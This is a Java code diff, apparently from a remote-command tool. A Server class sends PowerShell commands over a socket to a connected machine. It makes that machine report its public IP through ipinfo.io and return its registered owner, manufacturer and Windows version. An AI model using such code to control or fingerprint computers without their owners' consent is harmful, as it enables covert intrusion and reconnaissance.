@@ -28,7 +28,8 @@ public class Server {
 		dout = new DataOutputStream(s.getOutputStream());
 		din = new DataInputStream(s.getInputStream());
 		
-		System.out.println("Connected to " + getIp());
+		System.out.println("Connected");
+		System.out.println("Retrieving system info...");
 		System.out.println(getSysInfo());
 	}
 	
@@ -48,31 +49,17 @@ public class Server {
 		return !s.isClosed();
 	}
 	
-	private String getIp() throws IOException {
-		String ip = "[not found]";
-		
-		if(s.isConnected()) {
-			dout.writeUTF(" ipconfig | Select-String -Pattern Wi-Fi -Context 0,4");
-			dout.flush();
-			ip = din.readUTF();
-			String[] aux = ip.split("IPv4");
-			ip = aux[1];
-			aux = ip.split(":");
-			ip = aux[1];
-			ip.replaceAll("[\n\r]", "");
-		}
-		
-		return ip;
-	}
-	
 	private String getSysInfo() throws IOException {
 		String sysInfo = "[not found]";
 		
 		if(s.isConnected()) {
+			dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
+			dout.flush();
+			sysInfo = "\n" + "Public ip: " + din.readUTF();
+			
 			dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
 			dout.flush();
-			
-			sysInfo = din.readUTF();
+			sysInfo += din.readUTF();
 		}
 		
 		return sysInfo;
